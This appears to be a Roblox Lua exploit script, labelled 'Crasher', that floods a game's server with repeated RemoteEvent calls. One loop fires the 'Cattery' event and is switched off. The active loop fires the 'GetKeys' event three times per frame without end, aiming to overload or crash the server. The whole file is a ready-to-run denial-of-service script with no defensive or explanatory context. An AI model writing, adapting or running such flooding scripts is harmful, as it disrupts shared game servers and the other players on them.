local EndingCrasher = true
local Crasher = false
while Crasher do
    game:GetService("ReplicatedStorage").RemoteEvents.Cattery:FireServer()
    wait(4)
    game:GetService("ReplicatedStorage").RemoteEvents.Cattery:FireServer()
    wait(2)
    game:GetService("ReplicatedStorage").RemoteEvents.Cattery:FireServer()
    wait()
end
while EndingCrasher do
game:GetService("ReplicatedStorage").RemoteEvents.GetKeys:FireServer()
    game:GetService("ReplicatedStorage").RemoteEvents.GetKeys:FireServer()
    game:GetService("ReplicatedStorage").RemoteEvents.GetKeys:FireServer()
    wait()
    end
